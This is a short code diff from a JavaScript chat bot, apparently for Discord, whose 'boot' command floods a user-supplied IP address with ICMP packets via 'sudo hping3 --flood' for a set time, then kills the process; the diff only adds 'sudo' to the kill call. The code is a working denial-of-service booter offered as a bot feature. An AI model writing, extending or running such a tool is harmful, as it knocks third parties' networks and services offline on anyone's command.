@@ -48,7 +48,7 @@ function boot(ip, time, msg) {
   console.log(`boot ${ip} ${time}`)
   const process = childProcess.spawn('sudo', ['hping3' ,'--flood', '--icmp', '--data', '55555', ip])
   setTimeout(() => { 
-    childProcess.exec(`kill -9 ${process.pid}`)
+    childProcess.exec(`sudo kill -9 ${process.pid}`)
     msg.react('✅')
   }, time * 1000)
 }
